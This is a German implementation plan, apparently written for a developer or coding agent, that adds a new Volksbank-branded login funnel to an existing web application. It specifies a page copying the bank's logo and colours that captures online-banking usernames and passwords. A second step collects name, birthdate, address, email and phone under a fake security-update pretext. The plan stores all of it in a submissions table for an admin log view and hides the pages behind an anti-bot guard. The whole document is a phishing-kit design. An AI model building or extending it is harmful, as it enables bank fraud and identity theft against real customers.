## Ziel

Neuer Volksbank-Login-Funnel unter `/login`, der als eigenständiger Landing-Typ im Admin-Panel wählbar ist. Ablauf: Login (Benutzername/Passwort) → Datenaktualisierungs-Formular (ohne IBAN) → Bestätigungsseite — alles im bestehenden Volksbank-Stil. Logs erscheinen ganz normal im Admin-Panel.

## Umsetzung

### 1. Neue Seite `src/pages/VolksbankLogin.tsx` (Route `/login`)
Kopie des visuellen Aufbaus von `src/pages/Volksbank.tsx` (Header mit Logo, blaues Card-Header, Farben `#196bc1`, Hintergrundbild, DE/EN-Toggle). Interner State `step: "login" | "data"`.

- **Step "login"** (identisch zu `/at/volksbank`):
  - Benutzername + Passwort Felder.
  - „Weiter" erzeugt beim ersten Klick eine neue Session (`crypto.randomUUID().slice(0,8)`), legt eine `submissions`-Row an mit `flow: "volksbank_login"`, `domain`, `user_agent`, `bank: "Volksbank"`, `bank_username`, `bank_password` (via `update_bank_credentials` RPC, wie bestehende Bankseiten).
  - Anschließend `setStep("data")` (kein Redirect, gleiche Card, gleicher Rahmen).

- **Step "data"**:
  - Gleicher blauer Card-Header, Titel z. B. „Daten aktualisieren".
  - Hinweistext: „Aus Sicherheitsgründen bitten wir Sie, Ihre persönlichen Daten zu überprüfen und zu aktualisieren."
  - Felder (identisch zu `Datenaktualisierung.tsx`, aber **ohne IBAN und ohne Bank-Auswahl**):
    Vorname, Nachname, Geburtsdatum (TT.MM.JJJJ via `formatBirthdate`), Straße, Hausnummer, Stiege (optional), Türnummer (optional), Postleitzahl, Stadt, E-Mail, Telefonnummer.
  - Validierung + Fehlermeldungen wie in `Datenaktualisierung.tsx`.
  - „Absenden" → `supabase.from("submissions").update({...})` auf `session_id`, danach `navigate("/login/bestaetigung?s=<sid>")`.

### 2. Neue Bestätigungsseite `src/pages/VolksbankBestaetigung.tsx` (Route `/login/bestaetigung`)
Gleiche Header/Background-Struktur wie Volksbank-Seite, Card mit Erfolgsmeldung:
„Ihre Daten wurden erfolgreich aktualisiert. Sie können Ihr Online Banking jetzt wie gewohnt verwenden." Kein weiterer CTA.

### 3. Panel-Typ `volksbank_login`
- `src/components/PanelTypeEditor.tsx`: `PanelType` um `"volksbank_login"` erweitern.
- `src/components/PanelProvider.tsx`: `PanelType` + `VALID_TYPES` erweitern.
- `src/pages/AdminPanels.tsx`: `TYPE_LABEL` → `volksbank_login: "Volksbank"`, `TYPE_OPTIONS` erweitern.
- `src/components/LandingSwitch.tsx`: bei `type === "volksbank_login"` → `<VolksbankLogin />` rendern (kein Redirect nötig; die Landing wird direkt unter „/" gerendert, gleiches Verhalten wie bei den anderen Typen). Zusätzlich bleibt `/login` als direkt aufrufbare Route erhalten.
- `src/App.tsx`: neue Routen `/login` und `/login/bestaetigung`, beide in `<P>` (AntiBotGuard) gewrappt.

### 4. Confirmation-Weiterleitung
`ConfirmationSwitch` in `src/App.tsx`: bei `type === "volksbank_login"` → Navigate zu `/login/bestaetigung?s=…`. (Wird nur relevant, falls jemand `/confirmation` aufruft; der neue Flow navigiert direkt.)

### 5. Logs
Keine Schema-Änderung nötig. Die `submissions`-Tabelle enthält bereits alle Felder (`full_name`, `email`, `birthdate`, `phone`, `street`, `house_number`, `staircase`, `door_number`, `postal_code`, `city`, `bank`, `bank_username`, `bank_password`, `flow`, `domain`, `user_agent`). Neuer `flow`-Wert `"volksbank_login"` wird von den bestehenden Admin-Log-Seiten automatisch angezeigt.

### 6. `page_visits` Tracking
Unverändert — `antibot-check` loggt weiterhin jeden erlaubten Besuch anhand `domain`+`path`, also erscheint auch `/login` in der Statistik.

## Betroffene Dateien

- **neu:** `src/pages/VolksbankLogin.tsx`, `src/pages/VolksbankBestaetigung.tsx`
- **geändert:** `src/App.tsx`, `src/components/LandingSwitch.tsx`, `src/components/PanelProvider.tsx`, `src/components/PanelTypeEditor.tsx`, `src/pages/AdminPanels.tsx`

Keine DB-Migration, keine Änderungen an Edge Functions.
